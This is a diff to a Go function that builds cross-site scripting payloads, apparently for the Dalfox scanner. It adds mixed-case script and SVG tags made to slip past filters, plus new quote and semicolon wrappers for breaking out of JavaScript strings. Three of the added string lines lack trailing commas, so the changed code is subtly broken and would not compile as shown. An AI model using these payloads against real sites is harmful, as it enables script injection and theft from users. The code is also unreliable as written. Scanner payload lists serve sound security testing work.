@@ -250,7 +250,12 @@ func getInJsPayload(ip string) []string {
 		"alert(DALFOX_ALERT_VALUE)",
 		"confirm(DALFOX_ALERT_VALUE)",
 		"prompt(DALFOX_ALERT_VALUE)",
-		"</script><svg/onload=alert(DALFOX_ALERT_VALUE)>",
+		"</sCRipt><sVg/onload=alert(DALFOX_ALERT_VALUE)>",
+		"</scRiPt><sVG/onload=confirm(DALFOX_ALERT_VALUE)>",
+		"</sCrIpt><SVg/onload=prompt(DALFOX_ALERT_VALUE)>",
+		"</sCriPt><ScRiPt>alert(DALFOX_ALERT_VALUE)</sCrIpt>"
+		"</scRipT><sCrIpT>confirm(DALFOX_ALERT_VALUE)</SCriPt>"
+		"</ScripT><ScRIpT>prompt(DALFOX_ALERT_VALUE)</scRIpT>"
 		"window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])",
 		"this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])",
 		"self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])",
@@ -277,8 +282,10 @@ func getInJsPayload(ip string) []string {
 		var tempPayload []string
 		for _, v := range payload {
 			tempPayload = append(tempPayload, "\"+"+v+"//")
+			tempPayload = append(tempPayload, "\";"+v+"//")
 			tempPayload = append(tempPayload, "\"+"+v+"+\"")
 			tempPayload = append(tempPayload, "\"-"+v+"-\"")
+			tempPayload = append(tempPayload, "\""+v+"\"")
 		}
 		return tempPayload
 	}
@@ -286,8 +293,10 @@ func getInJsPayload(ip string) []string {
 		var tempPayload []string
 		for _, v := range payload {
 			tempPayload = append(tempPayload, "'+"+v+"//")
+			tempPayload = append(tempPayload, "';"+v+"//")
 			tempPayload = append(tempPayload, "'+"+v+"+'")
 			tempPayload = append(tempPayload, "'-"+v+"-'")
+			tempPayload = append(tempPayload, "'"+v+"'")
 		}
 		return tempPayload
 	}
